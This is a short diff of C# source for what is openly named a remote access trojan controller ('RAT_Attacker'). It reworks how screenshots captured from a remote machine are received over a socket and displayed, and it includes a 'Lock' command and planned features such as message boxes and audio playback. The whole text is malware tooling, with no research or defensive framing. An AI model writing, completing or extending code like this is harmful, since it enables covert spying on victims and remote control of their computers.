@@ -1,22 +1,19 @@
-﻿using System.Drawing;
+﻿using System.IO;
 using System.Net;
 using System.Net.Sockets;
 using System.Text;
 using System.Windows;
-using Forms = System.Windows.Forms;
+using System.Windows.Media.Imaging;
 
 namespace RAT_Attacker
 {
     /*
-     * open screenshots in the same window
      * custom mboxes
      * play audio
      */
     public partial class MainWindow : Window
     {
         Socket client;
-
-        ImageConverter converter = new ImageConverter();
 
         public MainWindow()
         {
@@ -53,25 +50,16 @@ namespace RAT_Attacker
         private void TakeScreenshot(object sender, RoutedEventArgs e)
         {
             SendCommand("TakeScreenshot");
-            byte[] buffer = new byte[256_000];
+
+            byte[] buffer = new byte[128_000];
             client.Receive(buffer);
 
-            var form = new Forms.Form
-            {
-                ShowIcon = false,
-                Width = (int)Width,
-                Height = (int)Height
-            };
+            BitmapImage bitmapImage = new BitmapImage();
+            bitmapImage.BeginInit();
+            bitmapImage.StreamSource = new MemoryStream(buffer);
+            bitmapImage.EndInit();
 
-            var pictureBox = new Forms.PictureBox
-            {
-                Dock = Forms.DockStyle.Fill,
-                SizeMode = Forms.PictureBoxSizeMode.StretchImage,
-                Image = (Bitmap)converter.ConvertFrom(buffer)
-            };
-
-            form.Controls.Add(pictureBox);
-            form.Show();
+            image.Source = bitmapImage;
         }
 
         private void Lock(object sender, RoutedEventArgs e)
